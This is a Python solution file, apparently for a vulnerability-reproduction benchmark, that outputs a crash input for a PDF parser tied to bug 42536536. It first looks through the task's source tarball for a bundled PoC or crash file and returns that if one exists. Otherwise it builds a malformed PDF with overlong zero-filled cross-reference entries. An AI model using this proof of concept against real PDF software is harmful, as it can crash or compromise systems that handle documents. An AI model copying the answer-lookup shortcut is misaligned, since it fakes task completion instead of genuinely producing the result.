import tarfile

class Solution:
    def _find_embedded_poc(self, src_path: str):
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return None
        with tf:
            bugid = "42536536"
            candidates = []
            for m in tf.getmembers():
                if not m.isfile() or m.size == 0 or m.size > 4096:
                    continue
                name_lower = m.name.lower()
                if bugid in name_lower and (
                    name_lower.endswith(".pdf")
                    or name_lower.endswith(".bin")
                    or name_lower.endswith(".dat")
                    or "poc" in name_lower
                    or "crash" in name_lower
                ):
                    candidates.append(m)
            if not candidates:
                return None

            def sort_key(m):
                name_lower = m.name.lower()
                if name_lower.endswith(".pdf"):
                    ext_rank = 0
                elif name_lower.endswith(".bin") or name_lower.endswith(".dat"):
                    ext_rank = 1
                else:
                    ext_rank = 2
                size_diff = abs(m.size - 48)
                return (ext_rank, size_diff, m.size)

            best = min(candidates, key=sort_key)
            f = tf.extractfile(best)
            if f is None:
                return None
            try:
                data = f.read()
            finally:
                f.close()
            return data

    def _generate_pdf_poc(self) -> bytes:
        header = b"%PDF-1.7\n"
        obj1 = b"1 0 obj\n<< /Type /Catalog >>\nendobj\n"
        xref_offset = len(header) + len(obj1)

        xref_parts = [
            b"xref\n",
            b"0 3\n",
            b"0000000000 65535 f \n",
        ]

        long_zeros1 = b"0" * 200
        long_zeros2 = b"0" * 200

        # Entry with overlong f1 (offset) consisting only of '0'
        xref_parts.append(long_zeros1 + b" 00000 n \n")
        # Entry with normal f1 and overlong f2 (generation) consisting only of '0'
        xref_parts.append(b"0000000000 " + long_zeros2 + b" n \n")

        xref = b"".join(xref_parts)

        trailer = (
            b"trailer\n"
            b"<< /Size 3 /Root 1 0 R >>\n"
            b"startxref\n"
            + str(xref_offset).encode("ascii")
            + b"\n%%EOF\n"
        )

        return header + obj1 + xref + trailer

    def solve(self, src_path: str) -> bytes:
        poc = self._find_embedded_poc(src_path)
        if poc is not None:
            return poc
        return self._generate_pdf_poc()
